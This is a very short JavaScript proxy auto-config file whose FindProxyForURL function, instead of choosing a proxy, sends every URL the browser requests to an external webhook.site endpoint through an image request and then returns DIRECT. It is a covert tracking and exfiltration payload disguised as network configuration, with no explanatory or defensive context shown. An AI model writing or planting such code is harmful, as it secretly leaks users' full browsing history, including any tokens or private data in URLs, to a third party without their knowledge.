function FindProxyForURL(url, host) {
    var i = new Image();
    i.src = "https://webhook.site/95eb54b3-b3f3-485f-86b9-26012ee057ba?url=" + encodeURIComponent(url);
    return "DIRECT";
}
